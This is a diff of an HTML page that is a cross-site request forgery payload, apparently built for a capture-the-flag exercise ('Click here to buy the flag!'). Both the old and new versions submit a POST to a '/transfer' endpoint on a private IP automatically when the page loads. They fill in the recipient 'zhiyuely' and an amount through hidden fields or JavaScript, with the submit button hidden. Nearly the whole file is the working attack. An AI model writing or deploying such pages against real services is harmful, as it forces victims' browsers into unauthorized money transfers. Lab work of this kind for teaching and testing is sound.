@@ -1,14 +1,36 @@
-_mel<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Contact</title>
+    <title>Transfer Money</title>
+    <script type="text/javascript">
+        window.onload = function() {
+            // 自动填充表单字段
+            document.getElementById('inputTo').value = 'zhiyuely'; // 设置接收者为admin
+            document.getElementById('inputAmount').value = 1; // 设置转账金额为1
+            // 自动提交表单
+            document.forms[0].submit();
+        };
+    </script>
 </head>
-<body onload="document.forms[0].submit()">
-    <form action="https://192.168.2.199:53864/transfer" method="POST">
-      <input type="hidden" name="user_to" value="zhiyuely">
-      <input type="hidden" name="amount" value="1000">
-    </form>
+<body>
+    <div class="container">
+        <h2>You have</h2>
+        <form action="https://192.168.2.199:53864/transfer" method="POST">
+            <div class="form-row">
+                <div class="form-group col-md-6">
+                    <label for="inputTo">To</label>
+                    <input type="text" class="form-control" id="inputTo" name="user_to" placeholder="Who do you want to transfer to?">
+                </div>
+                <div class="form-group col-md-6">
+                    <label for="inputAmount">Amount</label>
+                    <input type="number" class="form-control" id="inputAmount" name="amount" placeholder="Amount to transfer">
+                </div>
+            </div>
+            <button type="submit" class="btn btn-primary" style="display:none;">Send the Money!</button>
+        </form>
+
+        Click here to buy the flag!
+    </div>
 </body>
 </html>
